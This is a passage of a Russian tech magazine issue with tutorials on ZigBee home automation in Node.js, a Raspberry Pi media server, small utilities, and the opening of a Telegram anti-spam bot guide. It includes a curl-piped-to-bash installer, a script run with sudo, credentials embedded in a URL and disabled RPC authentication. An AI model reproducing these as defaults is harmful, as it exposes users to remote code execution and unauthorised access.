  Выключатели Xiaomi Aqara на батарейках, работающие по протоколу
  ZigBee

Первым делом следует добавить устройство ZigBee в сеть. Для этого сначала
нужно сбросить его настройки на заводские и тем самым удалить информа‐
цию о предыдущей сети, если оно было добавлено прежде. Комбинация
сброса и добавления устройства для выключателей Xiaomi Aqara следующая:
зажать кнопку на пять секунд, пока светодиоды не начнут мигать, после чего
отпустить и ждать, когда закончится процесс добавления. Если включен
дебаг, то при добавлении устройства выводится подробный лог. Добавление
устройства может занять до одной минуты.
  После добавления устройства важно еще правильно с ним работать. Zig‐
bee‐shepherd не предос тавляет веб‐интерфейса для добавления устройств
и управления ими, вместо этого мощный JS API поз воляет получить пол ный
контроль над любым устройством и написать собственную систему автомати‐
зации.
  В вики есть пол ное описание всех функций. Но что бы быстрее разобрать‐
ся с ними, нужно понимать программную структуру устройства.
  IEEE address. Каждое устрой ство ZigBee имеет уникальный 48‐битный
MAC‐адрес, он зашит в девайс, и сбросить его невозможно. По MAC‐адресу
можно обращаться к устройству и получать информацию о нем.
   Endpoint. В устрой стве может быть несколько функций, например датчик
температуры и влажности или выключатель с дву мя кнопками. Для каждой
функции устройства создает ся отдельный Endpoint.
   Clusters. Группа команд, которые можно отправлять устройству. Нап‐
ример, команда genOnOff вклю чает или выключает устрой ство, а если
это лампа с диммером, то команда genLevelCtrl поз волит задать уровень
яркости.
   Attributes. У устройства мож но запросить его текущее состояние, обра‐
тившись в интересующий  Cluster. Например, командой genOnOff можно
узнать состояние атрибута onOff — оно может быть 0 или 1.
  Выключатель Xiaomi Aqara с одной кнопкой име ет следующую структуру:


{
  "profId": 260,
  "epId": 1,
  "devId": 24321,
  "inClusterList": [0, 3, 18, 25, 65535],
  "outClusterList": [0, 3, 4, 5, 18, 25, 65535],
  "clusters": {
    "genBasic": {
      "dir": {
        "value": 3
      },
      "attrs": {}
    },
    "genIdentify": {
      "dir": {
        "value": 3
      },
      "attrs": {}
    },
    "genGroups": {
      "dir": {
        "value": 2
      },
      "attrs": {}
    },
    "genScenes": {
      "dir": {
        "value": 2
      },
      "attrs": {}
    },
    "genMultistateInput": {
      "dir": {
        "value": 3
      },
      "attrs": {}
    },
    "genOta": {
      "dir": {
        "value": 3
      },
      "attrs": {}
    },
    "manuSpecificCluster": {
      "dir": {
        "value": 3
      },
      "attrs": {}
    }
  }
}

Чтобы обрабатывать нажатие кнопки, нужно отловить сообщение от вык‐
лючателя. Делается это с помощью события ind. Изменим код следующим
образом:


var ZShepherd = require('zigbee‐shepherd');
var zserver = new ZShepherd('/dev/ttyACM0');
zserver.on('ind', function (msg) {
    console.log("msg");
});
zserver.start(function (err) {
    if (err) console.log(err);
});

При нажатии кнопки придет сооб щение:


{
  endpoints: [
    {
      isLocal: [Function],
      device: [Object],
      profId: 260,
      epId: 1,
      devId: 24321,
      inClusterList: [Array],
      outClusterList: [Array],
      clusters: [Object],
      onAfDataConfirm: null,
      onAfReflectError: null,
      onAfIncomingMsg: null,
      onAfIncomingMsgExt: null,
      onZclFoundation: null,
      onZclFunctional: null,
      foundation: [Function],
      functional: [Function],
      bind: [Function],
      unbind: [Function],
      read: [Function],
      write: [Function],
      report: [Function]
    }
  ],
  data: {
    cid: 'genOnOff',
    data: {
      onOff: 0
    }
  }
}

Здесь
 • msg.endpoints[0].device.ieeeAddr — MAC‐адрес устрой ства;
 • msg.endpoints[0].epId — канал (endpoint) устройства;
 • msg.data — ID кластера и атрибут, в данном случае выключатель прислал
   команду genOnOff:0 .

Если проверять эти данные, то, нажимая на кнопку выключателя, можно будет
управлять другими устройствами ZigBee по определенному алгоритму. Нап‐
ример, при каждом нажатии включать‐выключать или только выключать группу
устройств.
   Zigbee‐shepherd полностью поддержи вает работу с диммиру емы ми лам‐
пами Ikea Trådfri и Philips Hue, поэтому для при мера можно настроить простой
алгоритм включения лампы с помощью выключателя Xiaomi Aqara. Добавляем
в код обработчик нажатия кнопки и включение лампы Ikea Trådfri на мак‐
симальную яркость:


var ZShepherd = require('zigbee‐shepherd');
var zserver = new ZShepherd('/dev/ttyACM0');
zserver.on('ind', function (msg) {
    console.log(msg);
    switch (msg.type) {
      case 'attReport':
            var epId = msg.endpoints[0].epId;
            var ieeeAddr = msg.endpoints[0].device.ieeeAddr;
            var data = msg.data;
            if (ieeeAddr === "0x00158d00015efcef" && epId === 1 &&
data.cid === "genOnOff") {
              // Get lamp endpoint
              var lamp = zserver.find(0x000b57fffe3298aa,1);
              // Turn on lamp
              lamp.functional("genLevelCtrl", "moveToLevelWithOnOff",
 {level: 255, transtime: 0}, function (err, rsp) {});
            }
            break;
        default:
            console.log(msg);
            break;
    }
});
zserver.start(function (err) {
    if (err) console.log(err);
});


УВЯЗЫВАЕМ НАШЕ РЕШЕНИЕ С ДРУГИМИ
Zigbee‐shepherd использует инфраструктуру Node.js, поэтому можно реали‐
зовать управление любыми объектами, для которых есть соответству ющие
библиотеки. Например, протокол MQTT  дает  возможность  интеграции
со многими системами домашней авто матизации, такими как OpenHub
и Home Assistant. Для пос ледней существует готовый проект на GitHub .
  Многие хабы и самостоятельные устройства Wi‐Fi вроде розеток под‐
держивают  управле ние  через  запросы  HTTP.  Команды можно  узнать
из документации, либо подглядеть в веб‐интерфейсе хаба умного дома, либо
проанализировать трафик от мобильного при ложения.
   Z‐Wave‐контроллер RaZberry имеет хорошо документированный HTTP API,
поэтому  не  составит  труда  написать  запрос  на  выключение  света.
Для отправки HTTP‐запросов требуется уста новить биб лиотеку request:


$ npm install request ‐‐save

Добавляем в код поддержку HTTP‐запросов и сам запрос на выключение
света:


var ZShepherd = require('zigbee‐shepherd');
var zserver = new ZShepherd('/dev/ttyACM0');
var request = require('request');
zserver.on('ind', function (msg) {
    switch (msg.type) {
      case 'attReport':
            var epId = msg.endpoints[0].epId;
            var ieeeAddr = msg.endpoints[0].device.ieeeAddr;
            var data = msg.data;
            if (ieeeAddr === "0x00158d00015efcef" && epId === 1 &&
data.cid === "genOnOff") {
              request('http://admin:admin@192.168.1.108:8083/ZAutom
ation/api/v1/devices/ZWayVDev_zway_7‐0‐37/command/off', function (
error, response, body) {
                  if (error) { console.log("‐‐‐ Error send request:",
 error); }
              });
            }
            break;
        default:
            console.log(msg);
            break;
    }
});
zserver.start(function (err) {
    if (err) console.log(err);
});

Минимальная домашняя авто матизации готова! В 26 строках кода запускает‐
ся сервер ZigBee, отслеживается нажатие кноп ки и исполня ется команда
управления светодиодной лампой или команда HTTP. Если подключить фрей‐
мворк веб‐приложений для Node.js (нап ример, express), то можно реали‐
зовать полноценный HTTP API для работы с устройствами ZigBee.
   Zigbee‐shepherd позволяет добавить к уже сущес твующей домашней авто‐
матизации на KNX, Z‐Wave или Wi‐Fi недорогие устройства ZigBee, которых
с каждым годом выпускается все больше.
ТРЮКИ
МАЛИНА
С САХАРОМ





                              Евгений Зобнин
                              Редактор Unixoid и Mobile
                                       zobnin@glc.ru





         РЕЦЕПТ НЕ СОВСЕМ ОБЫЧНОГО
         МЕДИАЦЕНТРА ИЗ RASPBERRY PI





За  шесть  лет  существо вания  Raspberry  Pi  появилось
огромное  количество  руководств,  как  превратить  его
в домашний мультимедиацентр. Вот только классический
мультимедийный центр из него настолько плохой, что про‐
игрывает даже китайским HDMI‐свисткам. Точ нее, так кажет‐
ся, пока ты не начинаешь мыслить, как линук соид.


Первоначальная идея большинства людей, которые покупают Raspberry Pi,
чтобы сделать из него ТВ‐приставку, примерно следующая: подключаем
к «малинке» жесткий диск или флеш ку с фильмами, подключаем пульт
с гироскопом, устанавливаем мультимедийный комбайн Kodi и наслаждаемся
фильмами, ютюбчиком, ТВ и радио.
   Это абсолютно логичное решение, которое ты будешь проклинать уже
через два часа. Kodi — прекрасная оболочка для мультимедийной приставки,
но не лучшим образом оптимизированная для Raspi. Иной раз ее приходится
перезапускать, курсор мыши во время просмотра видео дико тормозит,
а некоторые функции не работают.
  Плюс ко всему ты, конечно же, стол кнешь ся с неработос пособностью
половины опубликованных в мес тном репозитории плагинов. Хочешь пос‐
мотреть YouTube — фиг тебе, пла гин работа ет один раз через десять, пос‐
лушать радио можно, но придется еще най ти работающий плагин. ТВ? Даже
не пытайся.
   2018 год, стримы, облака, Netﬂix, а ты сидишь и смотришь видоси ки с жес‐
ткого диска с тормозящим курсором. А если попробуешь открыть YouTube
в браузере, то увидишь такое слайд‐шоу, что мож но на конференциях выс‐
тупать.


МЫСЛИМ В ОБРАТНУЮ СТОРОНУ
Raspberry Pi кажется настолько непригодным к использованию в качестве
ТВ‐приставки, что я мог бы порекомендовать купить вместо него нас тоящую
ТВ‐приставку (типа Nvidia Shield) или даже китай ский HDMI‐свисток. Но я
не буду этого делать, потому что у Raspberry Pi есть два преиму щества:
 1. Это мини‐ПК на базе Linux, с которым можно сделать все что угодно (в
   отличие от залоченных приставок и приставок на базе Android).
 2. У Raspberry Pi большое комь юнити и мно жес тво разработчиков.

Не стоит пытаться превратить Raspberry  Pi в клас сическую прис тавку,
управляемую с пульта. Его нужно превратить в сервер, которым ты сможешь
рулить с ноутбука или смартфона. Захотел пос мотреть YouTube — взял
телефон, запустил аппликуху, выбрал видео и нажал плей. Хочешь музыку —
у тебя на телефоне есть виджет. Торренты? Скачиваешь файлик на ноутбук
и с помощью удаленного торрент‐клиента закидываешь на Raspi.


ЧТО ТЕБЕ ПОНАДОБИТСЯ
Итак, тебе нужны следующие вещи:
 1. Raspberry Pi 3.
 2. SD‐карта минимум на 8 Гбайт, минимум 10‐го класса.
 3. Внешний жесткий диск для хранения музыки и фильмов.
 4. Клавиатура и мышь (нуж ны только при началь ной нас тройке и во время
   неполадок).
 5. USB‐зарядник на 2,5 А и microUSB‐кабель.

Raspberry  Pi без проб лем дру жит с Bluetooth‐клавиатурами и мышами,
но работать они будут, естес твенно, только если загрузка ОС прошла
успешно. В качестве мыши очень удобно исполь зовать пульт с гироскопом
(на Aliexpress такие стоят 3–5 долларов). Он эму лирует движения мыши
с помощью наклонов.
   USB‐зарядник подойдет любой, даже мень ше, чем на 2,5 А. Проб лема
только в том, что, если Raspi заметит нехватку энергии, он сбросит час тоту
процессора, а ты увидишь значок молнии в пра вом верхнем углу экрана.
В это же вре мя может произойти оста нов жесткого диска и обес точивание
периферии. Стоит озаботиться покупкой хорошего зарядника и microUSB‐
кабеля, нередко проб лема недостатка питания именно в нем.
  Не буду в подробностях расписывать процесс установки ОС на Raspberry
(об этом и так рассказыва ют на каждом углу). Скажу лишь, что я рекомендую
использовать официальный дистрибутив Raspbian (для гарантии того, что все
работает как надо) и что сам процесс установки, по сути, сводится к скачива‐
нию образа ОС и его заливке на SD‐карту. В Linux это делается в две коман‐
ды:


$ wget https://downloads.raspberrypi.org/raspbian_latest ‐O raspbi
an_latest.zip
$ unzip ‐p 2018‐04‐18‐raspbian‐stretch.zip | sudo dd of=/dev/sdX bs=
4M conv=fsync

Здесь /dev/sdX — это SD‐карта, реаль ное имя можно узнать с помощью
команды lsblk или dmesg сра зу пос ле подключения карты памяти.
   Вставляем карточку в Raspberry Pi, дожидаемся загрузки рабоче го стола,
подклю чаемся к сети Wi‐Fi. Запус каем конфигура тор raspi‐conﬁg из консоли:


$ sudo raspi‐config

И включаем SSH‐сервер: Interfacing options → SSH → Yes.
  С этого момента клавиату ра и мышь нам больше не нужны. Все, что нужно,
мы сможем сде лать, подключившись к Raspi с помощью SSH.





                     Рабочий стол Raspberry Pi


ФИЛЬМЫ И YOUTUBE
Главная задача мультимедийной приставки — про игры вать видео. Для Rasp‐
berry Pi доступны различные плееры, но почти все они имеют проб лемы
с воспроизведением видео с высоким раз решением. Проще говоря, они
не умеют декодировать видео с помощью аппа рат ного ускорителя и делают
это на центральном процес соре, который любит тормозить.
  Но есть исключение — omxplayer. Он был создан разработчиками Kodi,
чтобы убедиться  в способности  Raspberry  Pi  к декодированию видео
перед началом портирова ния самого мультимедийного комбай на. Omxplayer
без всяких проблем перева ривает HD и Full HD видео, но управляется исклю‐
чительно из консоли. Другими сло вами, чтобы запус тить вос произведение,
тебе придется сделать так:


$ omxplayer /путь/к/видео.avi

Чтобы выбрать аудиовыход (HDMI или выход на самом Raspi), используй
опцию ‐o:


$ omxplayer ‐o local /путь/к/видео.avi

Для управления воспроизведением используй кла виши: пробел — пауза,
+/‐ — громкость, стрелки — перемотка.
  Считаешь это удоб ным? Я тоже нет, поэтому предлагаю использовать
omxplayer в связке с приложением  Raspicast для  Android. Это клиент
для Raspberry Pi и omxplayer, поз воляющий удаленно включать любые видео,
хранящиеся на жестком диске, и даже видео с YouTube.
   Установи приложение на свой смартфон, укажи IP‐адрес Raspberry Pi,
а также имя и пароль для подключения к SSH. Далее ты можешь либо исполь‐
зовать встроенный в приложение файловый браузер для выбора видео, либо
отправить любое видео с YouTube: запускаешь YouTube на телефоне, выбира‐
ешь видео, нажимаешь кнопку «Поделить ся» и выбираешь в списке Cast
(Raspicast).
  Видео можно либо запус тить немед ленно, либо добавить в плей‐лист (для
этого надо выбрать Queue (Raspicast) в меню «Поделиться»). К сожалению,
стримы YouTube не поддерживаются, зато поддерживаются плей‐листы, их
можно отправлять в Raspicast целиком, а он добавит их в очередь.
  Уже запущенным omxplayer можно управлять через SSH. Для этого
понадобится скрипт dbuscontrol. У него достаточно интуитивное управление:


$ dbuscontrol.sh status
$ dbuscontrol.sh pause
$ dbuscontrol.sh togglesubtitles





          Raspicast умеет играть видео с жесткого диска и с YouTube


YOUTUBE: ВАРИАНТ ВТОРОЙ, ГЛЮЧНЫЙ
На самом деле Raspberry Pi таки умеет вос производить видео в браузе ре
на приемлемой скорости. Но есть один нюанс: для этого необходимо акти‐
вировать драйвер OpenGL, который работа ет, мягко говоря, не совсем ста‐
бильно. К примеру, ты можешь получить гра фические артефакты на экране,
неустойчивую работу системы или вообще отказ заг рузки. Если это не пугает,
тогда выполни следующие действия.

1. Добавь в файл /boot/config.txt такие строки (192 — количество отве‐
денной для виде оадаптера памяти):


dtoverlay=vc4‐kms‐v3d
gpu_mem=192

2. Обно ви фирмварь и перезагрузись:


$ sudo rpi‐update

3. Скачай скрипт chromium‐mod.sh и запусти:


$ chmod +x chromium‐mod.sh
$ sudo ./chromium‐mod.sh

Он изменит флаги запуска Chromium таким образом, чтобы он использовал
аппаратное ускорение.
   Теперь запусти Chromium, активируй плагин h264ify (он уже установлен)
и попробуй включить видео на YouTube. Если, как и прежде, наблюдаются тор‐
моза, стоит про верить, что аппаратное ускорение действительно было акти‐
вировано. Для этого открой chrome://gpu.
   Кстати, в Quake 3 теперь тоже можно играть.





  Даже если видео заработает, загрузку браузера ты все равно будешь
  ждать несколько минут


МУЗЫКА
Раз уж мы решили использовать Raspberry Pi в качестве единого муль‐
тимедийного цен тра, то логично установить на него аудиоплеер с удаленным
управлением. На эту роль лучше всего подходит MPD (Music Player Daemon).
  Мы запустим его на Raspberry Pi так, чтобы он постоянно висел в фоне
и был готов играть музыку. А на ноутбук, домашний комп и смартфон уста‐
новим MPD‐клиент, с помощью которо го и будем выбирать и запускать
музыку.
   Устанавливаем:


$ sudo apt install mpd

Скопируем дефолтовый конфиг:


$ mkdir .config/mpd
$ cp /etc/mpd.conf .config/mpd/

Изменим несколько строк:


# Каталог с музыкой
music_directory /media/pi/Elements/download
# Каталог с плей‐листами
playlist_directory /media/pi/Elements/playlists
# Пользователь, от имени которого будет работать демон
user "pi"
# Слушаем подключения на всех адресах
bind_to_address "0.0.0.0"

В данном примере я использовал /media/pi/Elements/download в качестве
каталога с музыкой. Это каталог download на дис ке WD Elements, под ключен‐
ном по USB. Если ты используешь флешку или жесткий диск, он также будет
подклю чен куда‐то к /media/pi, но, естес твенно, под другим именем.
   Чтобы не иметь заморочек с правами доступа, нам нужно запускать MPD
как пользовательский процесс. Для этого необходимо отключить системный
сервис MPD и создать пользовательский. Первая задача выполняется так:


$ sudo systemctl stop mpd.socket
$ sudo systemctl disable mpd.socket

Чтобы решить вторую, создадим каталог для поль зовательских сервисов
SystemD:


$ mkdir ‐p .config/systemd/user/

В нем создаем файл mpd.service следующего содержания:


[Unit]
Description=Music Player Daemon
[Service]
ExecStart=/usr/bin/mpd ‐‐no‐daemon
[Install]
WantedBy=default.target

Сохраняем, активируем и запускаем:


$ systemctl ‐‐user enable mpd.service
$ systemctl ‐‐user start mpd.service

Теперь MPD будет автоматичес ки запус кать ся от имени пользователя пос ле
загрузки.
   Клиентов для MPD существует мно жес тво для самых разных платформ,
вклю чая Linux, Windows, macOS, Android и iOS. Лично я предпочитаю исполь‐
зовать консольный ncmpc на ноутбуке с Linux и MPD Control на Android.
   Да, чуть не забыл — MPD не умеет подхватывать файлы сразу. Чтобы он их
увидел,  необходимо  обно вить  базу  композиций.  Это можно  сделать
с помощью соот ветствующей кнопки или хоткея в клиенте.





                  Ncmpc: кон соль ный клиент MPD


ТОРРЕНТЫ
Наш Raspberry Pi теперь умеет играть видео и аудио с жесткого диска, но где
брать это самое аудио и видео? Конечно же, в торрент‐сетях! Нет, я не про
пиратство, я про чиптюны и обра зовательное видео.
  С торрентами мы поступим точно так же, как с музыкой. А именно: уста‐
новим демон, который будет качать/раз давать файлы, но при этом управлять‐
ся извне, с того же смартфона или ноут бука.
   Лучше всего на эту роль подойдет transmission‐daemon. Так что устанав‐
ливаем:


$ sudo apt install transmission‐daemon

Как и в случае с MPD, сразу отключаем системный сервис:


$ sudo systemctl stop transmission‐daemon.service
$ sudo systemctl disable transmission‐daemon.service

Копируем дефолтовые конфиги:


$ sudo cp ‐r /etc/transmission‐daemon /home/pi/.config/
$ sudo chown ‐R user_name /home/pi/.config/transmission‐daemon

Открываем   файл   ~/pi/.config/transmission‐daemon/settings.json
и меняем следующие строки:


"rpc‐authentication‐required": false,
"rpc‐whitelist": "127.0.0.*,192.168.31.*",
"rpc‐whitelist‐enabled": true,
"download‐dir": "/media/pi/Elements/download",
"incomplete‐dir": "/media/pi/Elements/download",

В первых трех строках мы отклю чаем аутентификацию (в домашней сети она
не нужна) и указываем подсети, из которых мож но будет подключиться
к Transmission. Замени 192.168.31.* на свою домашнюю сеть. Последние
две строки — каталог загрузки.
  Рекомендую также установить дневные лимиты на скорость загрузки/отда‐
чи данных. Это нужно, чтобы Transmission заг ружал канал только по ночам,
а днем не мешал другим юзерам сети.
  Следующие настройки включают ограничение в 100 Кбайт/с c 6 утра
до 11 вечера (вре мя зада ется в минутах):


"alt‐speed‐enabled": true,
"alt‐spee‐d‐down": 100,
"alt‐speed‐up": 100,
"alt‐speed‐time‐enabled": true,
"alt‐speed‐time‐begin": 360,
"alt‐speed‐time‐end": 1380,
"alt‐speed‐time‐day": 127,

Опять же, как и в случае с MPD, нам нужен пользовательский сервис
для запуска Transmission. Соз дадим файл ~/.config/systemd/user/trans‐
missiond.service с такими строками:


[Unit]
Description=Transmission
[Service]
ExecStart=/usr/bin/transmission‐daemon ‐f ‐‐config‐dir /home/pi/.
config/transmission‐daemon/
[Install]
WantedBy=default.target

Активируем и запустим сервис:


$ systemctl ‐‐user enable transmissiond.service
$ systemctl ‐‐user start transmissiond.service

Для управления Transmission мож но взять один из официальных клиентов
или любой другой на твой вкус. Я использую transmission‐remote‐gtk на ноут‐
буке и Transmission Remote на смартфо не.





              Управляем торрент‐клиентом со смартфона


РЕТРОИГРЫ
Эмуляция старых приставок — одна из тех вещей, с которыми новые Raspber‐
ry Pi справляют ся лучше всего. Есть люди, которые покупают Raspi, ставят
на него дистрибутив RetroPie, подклю чают джой стики и используют исклю‐
чительно в качестве игро вой приставки.
  Ты можешь пой ти тем же путем, но имей в виду, что RetroPie — специали‐
зированный дистрибутив, который заг ружа ется либо в интерфейс RetroArch
для запуска игр, либо в Kodi для прос мотра фильмов и прослушивания
музыки.
  С другой стороны, никто не зап рещает тебе остаться на текущем дистри‐
бутиве и просто установить в него тот самый интерфейс RetroArch для запус‐
ка старых игр (по сути, это обертка над эмуляторными движками). Он есть
в репозитории Raspbian, но лучше взять преднас троенный из RetroPie.
   Итак, для начала кло ниру ем репозиторий RetroPie:


$ sudo apt‐get install git lsb‐release
$ git clone ‐‐depth=1 https://github.com/RetroPie/RetroPie‐Setup.git

Запустим инсталлятор:


$ cd RetroPie‐Setup
$ chmod +x retropie_setup.sh
$ sudo ./retropie_setup.sh

Нас интересует всего один пункт: Manage Packages → Core → retroarch.
Выбираем и устанавливаем.





                       Ус танавливаем RetroArch

Запускаем RetroArch:


$ /opt/retropie/emulators/retroarch/bin/retroarch

Для начала настроим джойстик. Идем в Settings → Input → Input User 1 Binds.
Как и в любом эмуляторе, выбираем нуж ную кноп ку и нажимаем ее на джой‐
стике. По умолчанию RetroArch эмулирует универсальный джойстик RetroPad,
расположение кнопок на котором такое же, как на джойстике SNES.
   Также сразу включаем комбинацию для быстро го выхода в меню: Menu
Toggle Gamepad Combo → выбираем Start + Select или любую дру гую ком‐
бинацию на свой вкус.
  Далее необходимо уста новить движ ки эмуляции. Переходим на главный
экран, затем Load Core → Download core... Нас интересуют сле дующие движ‐
ки:
 • fceumm — NES;
 • genesis_plus_gx — Sega Mega Drive 2;
 • snes9x2010 — Super Nintendo;
 • pcsx_rearmed — Sony PlayStation 1.

И последнее. Переходим в Settings → Directory → File Browser и выбираем
каталог с ROM’ами.
   Это все. Теперь, если, например, ты хочешь поиграть в «Сегу», переходи
в Load Core → genesis_plus_gx, далее Load Content и выбирай игру.
   Ах да. RetroArch под держивает ачивки для множества игр. Регистрируйся
на retroachivements, затем иди в меню Settings → Achivements и вбивай свои
логин‐пароль. RetroArch сам активиру ет систему ачивок, когда обнаружит заг‐
рузку поддерживаемого ROM’а.





                     Ин терфейс RetroArch


ВЫВОДЫ
Raspberry Pi не мультимедийный центр и никогда и не должен был быть им.
Это просто маленький компь ютер, который умеет немного фильмов, музыки
и ретроигр. Но имен но этим он и хорош, ведь ты волен сам придумывать ему
применение. Не нравит ся Kodi, как мне, — исполь зуй SSH и голый omxplayer.
Установи MPD и вклю чай музыку хоть с дру гого конца города.
ТРЮКИ





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



     MARKDOWN PAGE — СКРИПТ, КОТОРЫЙ ПРЕВРАТИТ
     MARKDOWN В HTML ОДНОЙ СТРОКОЙ
      Формат Markdown, как известно, придуман, чтобы не набирать вруч‐1       ную теги HTML. Но когда тебе нуж но сделать совсем уж простую
        страничку на скорую руку, то велик соб лазн все же писать сразу
        в HTML. Или нет — если у тебя под рукой есть ссылка на скрипт
        markdown page.





      С markdown page достаточно вста вить в текстовый файл одну стро‐
           ку, и весь документ ста нет вос при ниматься браузером как страница,
        а все элементы Markdown будут пра вильно отренде рены в HTML.
        Вот эта строка:


        <script src="https://cdn.rawgit.com/oscarmorrison/md‐page/
        5833d6d1/md‐page.js"></script><noscript>

        Чисто теоретичес ки таким образом можно сделать целый сайт, син‐
        хронизируя файлы  из  папки,  но  в  этом  случае  рекомендую
        не городить свой огород и использовать статический генератор (я,
          к примеру, подробно писал о генераторе Lektor).
           Кстати, если тебя не устра ивает, что скрипт загружается из ре‐
        позитория автора (вдруг тот решит уда лить его или, например, вста‐
         вить какую‐нибудь гадость), то никто не запрещает положить копию
        на свой сервер. Заодно можешь сменить стили на свои, отредак‐
        тировав содержимое файла script.js.


      TERMTOSVG — УТИЛИТА ДЛЯ ЗАПИСИ ПРОИСХОДЯЩЕГО
      В ТЕРМИНАЛЕ В ВИДЕ SVG
       Предположим, ты хочешь записать все, что будешь делать в тер‐2        минале. Как это организовать? Можно записать видео — оно будет
       много занимать, а если залить его на видеохос тинг, тот бес пощадно
       сожмет ролик. Дру гой вариант — воспользоваться замечательным
        сервисом asciinema.org, о котором мы уже писали. Но если хочешь
         вставить на сайт видео без всяких плагинов, твой выбор — утилита
         termtosvg.
          Для начала уста навливаем его (у тебя должен быть Python 3):


        pip3 install ‐‐user termtosvg

       Заодно будут установлены библиотеки pyte и lxml, если их нет в сис‐
         теме.
          Теперь запус каем саму утилиту, наб рав termtosvg. Начнется
        запись и будет продолжать ся до тех пор, пока ты не напишешь exit.
        Получившийся файл с анимацией по умол чанию отправится в папку
        /var/, но при запус ке можешь указать желаемый путь и название.





        Также можно ука зать размеры окна, добавив ключ ‐g, например ‐g
        82x18. Или задать более интересную цветовую схему при помощи
        клю ча ‐t. Выбрать из семи готовых вариантов поможет галерея
        с примерами. О том, как кон верти ровать из формата cast в SVG,
       можешь узнать в ма нуале.
          Чтобы воспроизвести получившийся ролик, достаточно написать
        termtosvg <название файла> либо просто открыть его в браузере.


      WINDOWS 95 — ОПЕРАЦИОНКА ИЗ НАШЕГО ДЕТСТВА В
      ВИДЕ ДЕСКТОПНОГО ПРИЛОЖЕНИЯ
        Когда‐то установка Windows 95 была целым событием: хорошенько3         откинувшись на спин ку кресла, мы смотрели на ползущие синие
        полоски и слушали, как двухскоростной сидиром неторопливо кру‐
         тит диск и убаюкивающе потрескивает вин честер. Теперь старень‐
        кую «Вин ду» можно скачать за пару минут и запус тить в один клик.
       При этом лучше не думать, какие технологические извращения поз‐
        воляют ей работать.
        В репозитории Феликса Рейзберга ты можешь найти заниматель‐
       ную сборку Windows 95: это исполняемый файл размером око‐
        ло 450 мегабайт, внутри которого — фреймворк Electron, эмулятор
           Virtual x86 и образ диска с уста новленной Windows. Другими сло‐
        вами, это приложение‐браузер, в котором благодаря JavaScript
        работает компьютер, внут ри которого живет ничего не подозрева‐
       ющая о таком рас кладе Windows 95.





       Браузерные эмуляторы — не новин ка. Год назад я в этой рубрике
        делал небольшой их обзор, где был и v86. Его недостатки с тех пор
        все те же: нет возможнос ти подключить интернет (и посмеяться
        над тем, как древний IE пытается пережить современную верс тку
        сайтов) и, конечно, все страшно медленно — по крайней мере,
        на моем ноутбуке.
         Впрочем, судя по отзывам, обладателям более производитель‐
        ных машин удавалось запустить на Virtual x86 игры того времени. Ну
        а я, пожалуй, еще немного погоняю в «Сапера»!
КОДИНГ


КАК НАПИСАТЬ
И ЗАДЕПЛОИТЬ
БОТА НА TYPESCRIPT
ЗА ПОЛЧАСА





                                                              Никита Колмогоров
                                                                           nikita@borodutch.com

       СТОП-СПАМ
  ДЛЯ «ТЕЛЕГРАМА»





К тебе в уютный и ламповый  чат заходит непонятный
и никому не известный человек. Ты приветствуешь его, но он
угрюмо молчит. Только ты успе ваешь мысленно оправдать
его поведение, как он подло кидает рекламу очередной
мошенничес кой криптовалютной груп пы. Знакомо? Сегодня
мы закодим и запустим в про дакшен собствен ное решение,
которое положит конец гнусным спамерам!


Меня зовут Никита, и я программист: зараба тываю программи рованием
на хлеб насущный и в сво бодное время пишу раз ного рода инструменты,
которые упрощают жизнь пользователям интернета. Некоторые ты, воз‐
можно,  используешь. Один  из моих самых  популярных продуктов —
это @voicybot, бесплатный бот для «Телеграма», который прос то переводит
аудиосообщения в текст. На момент написа ния статьи им пользуется более
полумиллиона чатов, а одних только голосовых сообщений через него про‐
ходит более 40 тысяч в сутки.
  На самом деле создать чат‐бота для Telegram с имеющимися инструмен‐
тами стало максимально просто, что я и собира юсь продемонстри ровать
в этой статье. Буквально за полчаса мы с тобой напишем достаточно слож‐
ного антиспам‐бота на Node.js с использованием TypeScript 3 и хранением
записей в MongoDB, а пос ле закинем его на Digital Ocean и настроим быс‐
трый и бесплатный CI на основе простых веб‐хуков GitHub. Конечно, можно
было бы развернуть все и на «Докере», но, думаю, новичкам в программи‐
ровании сложнее разбираться с этой маги ей. Сегодня только олдскул!


Настройка окру жения
Хоть в статье я и буду использовать мой верный «Мак», на дру гих платформах
все примерно так же, за исключением некото рых нас троек и процесса уста‐
новки программ и утилит. Если у тебя возникнут проблемы с установкой,
можешь связаться со мной в Telegram — попробую помочь.
  В качестве IDE (или тексто вого редактора, смотря какого лагеря этого
холивара придерживаться)  я вос пользуюсь VSCode. Хранить  код  буду
на GitHub. Скачай и уста нови себе VSCode, а затем зарегистрируйся
на GitHub.
  Первым делом стоит установить то, на чем мы будем писать проект, —
Node.js. Можно стянуть инсталлятор c официального сайта, но я край не
рекомендую использовать NVM — менеджер версий для Node.js, который
позволяет не только установить раз ные версии, но и переключаться между
ними. Установить его можно из официального репозитория следующей
командой:


$ curl ‐o‐ https://raw.githubusercontent.com/creationix/nvm/v0.33.11/
install.sh | bash

Советую  использовать  наиболее  акту альную  команду  из  репозитория
Readme. Не забудь переза пустить терминал после установки NVM. После
стоит установить сам Node.js. У меня один надца тая версия, но все последу‐
ющие, в принципе, дол жны работать примерно так же. Установим последнюю
версию «Ноды»:


$ nvm install node

Если после выпол нения $ which node терминал выдает папку, то все прошло
успешно. Вместе с Node.js ставится и менеджер пакетов NPM, который мы
заменим на более быстрый yarn. Пропиши следующую команду, чтобы уста‐
новить его:


$ npm install ‐g yarn

Без опций npm и yarn добавляют и устанавлива ют пакеты в откры тую папку
проекта. Однако если к npm добавить флаг ‐g, то пакет установится пря мо
в систему (на самом деле в пользователя — но углубляться не будем) и будет
доступен как отдельное приложение. Таким образом, мы установи ли yarn
отдельным приложением и уже будем исполь зовать его. Время заставить
yarn установить TypeScript 3 гло бально! Дела ется это не флагом, а отдель‐
ным аргументом при вызове:


$ yarn global add typescript

Одна команда — и у тебя в системе теперь есть TypeScript. Вся мощь Unix
на кончиках пальцев!
  Последний кусочек паз ла — это база данных MongoDB, которую мы
и будем использовать для это го про екта. MongoDB — база данных типа
NoSQL,  что  означает  отсутствие  очевидных  свя зей между  таблицами
при помощи связных таблиц (или join tables), но зато дает упрощенную струк‐
туру данных в читабельном виде и простей шие миграции. Челове ческим язы‐
ком: эффектив ных связей между объекта ми быть не может, но разрабаты вать
проще.
  Проще всего установить MongoDB с официального сайта. Разработчики
будут всячески пытаться продать тебе собственное хранилище базы данных
(БД) в облаке — не ведись на провокации. Все хранилища БД в облаках
дешевые только до первых 10 тысяч пользователей, дальше тебя начнут
